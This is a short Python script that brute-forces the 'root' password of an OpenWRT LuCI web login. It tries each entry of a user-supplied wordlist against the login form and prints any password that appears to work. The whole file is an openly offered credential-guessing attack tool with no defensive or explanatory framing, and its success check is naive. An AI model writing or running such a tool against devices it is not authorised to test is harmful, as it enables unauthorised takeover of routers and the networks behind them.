import requests

def read_dictionary(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        return file.read().splitlines()

def attempt_login(url, username, password):
    session = requests.Session()

    response = session.post(url, data={'luci_username': username, 'luci_password': password})
    return response.ok  

def main():
    url = input("Please enter your OpenWRT login address (e.g. http://192.168.1.1/cgi-bin/luci/): ")
    dictionary_file_path = input("Please enter the dictionary file path: ")
    
    username = 'root' 
    passwords = read_dictionary(dictionary_file_path)
    
    for password in passwords:
        print(f'Trying password: {password}')
        if attempt_login(url, username, password):
            print(f'Success! Password is: {password}')
            break
    else:
        print('No valid password found.')

if __name__ == '__main__':
    main()